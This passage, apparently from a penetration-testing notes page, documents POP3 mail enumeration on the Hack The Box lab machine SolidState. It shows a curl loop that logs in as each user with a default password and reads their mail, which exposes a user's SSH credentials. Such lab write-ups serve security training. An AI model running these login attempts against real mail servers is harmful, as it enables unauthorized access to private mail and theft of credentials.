# POP3
----

## Mail Enumeration
* Htb: SolidState

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/SolidState]
  └──╼ $for u in $(cat users.txt)
  >  do   echo $u
  >       curl -u $u:password pop3://10.129.29.189
  > done
  james
  
  thomas
  
  john
  1 743
  mindy
  1 1109
  2 836
  mailadmin
  
  ┌─[✗]─[rio@parrot]─[~/Htb/SolidState]
  └──╼ $curl -u john:password pop3://10.129.29.189/1
  Return-Path: <mailadmin@localhost>
  Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
  MIME-Version: 1.0
  Content-Type: text/plain; charset=us-ascii
  Content-Transfer-Encoding: 7bit
  Delivered-To: john@localhost
  Received: from 192.168.11.142 ([192.168.11.142])
            by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
            for <john@localhost>;
            Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
  Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
  From: mailadmin@localhost
  Subject: New Hires access
  John,
  
  Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
  
  Thank you in advance.
  
  Respectfully,
  James
  
  ┌─[rio@parrot]─[~/Htb/SolidState]
  └──╼ $curl -u mindy:password pop3://10.129.29.189/1
  Return-Path: <mailadmin@localhost>
  Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
  MIME-Version: 1.0
  Content-Type: text/plain; charset=us-ascii
  Content-Transfer-Encoding: 7bit
  Delivered-To: mindy@localhost
  Received: from 192.168.11.142 ([192.168.11.142])
            by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
            for <mindy@localhost>;
            Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
  Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
  From: mailadmin@localhost
  Subject: Welcome
  
  Dear Mindy,
  Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
  
  We are looking forward to you joining our team and your success at Solid State Security.
  
  Respectfully,
  James
  ┌─[rio@parrot]─[~/Htb/SolidState]
  └──╼ $curl -u mindy:password pop3://10.129.29.189/2
  Return-Path: <mailadmin@localhost>
  Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
  MIME-Version: 1.0
  Content-Type: text/plain; charset=us-ascii
  Content-Transfer-Encoding: 7bit
  Delivered-To: mindy@localhost
  Received: from 192.168.11.142 ([192.168.11.142])
            by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
            for <mindy@localhost>;
            Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
  Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
  From: mailadmin@localhost
  Subject: Your Access
  
  Dear Mindy,
  
  
  Here are your ssh credentials to access the system. Remember to reset your password after your first login.
  Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
  
  username: mindy
  pass: P@55W0rd1!2@
  
  Respectfully,
  James
  ```
  
  